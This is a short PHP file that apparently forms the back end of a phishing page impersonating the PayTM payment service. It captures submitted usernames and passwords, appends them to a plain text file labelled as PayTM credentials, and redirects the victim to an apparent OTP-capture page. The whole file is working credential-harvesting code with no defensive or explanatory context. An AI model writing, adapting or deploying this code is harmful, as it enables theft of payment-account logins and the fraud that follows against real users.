<?php
file_put_contents("usernames.txt", "PayTM Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: otp.login.php');
exit();
?>
